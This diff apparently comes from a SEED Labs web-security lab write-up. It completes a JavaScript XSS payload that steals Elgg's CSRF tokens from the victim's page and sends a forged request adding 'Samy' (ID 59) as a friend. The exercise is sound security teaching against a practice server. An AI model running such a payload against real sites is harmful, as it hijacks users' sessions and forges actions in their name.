@@ -59,7 +59,7 @@ Link: https://github.com/seed-labs/seed-labs/tree/master/category-web/Web_SQL_In
     var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; ➀
     var token="&__elgg_token="+elgg.security.token.__elgg_token; ➁
     //Construct the HTTP request to add Samy as a friend.
-    var sendurl="http://www.seed-server.com/action/friends/add?friend=??" + ts + token;
+    var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
     //Create and send Ajax request to add friend
     Ajax=new XMLHttpRequest();
     Ajax.open("GET", sendurl, true);
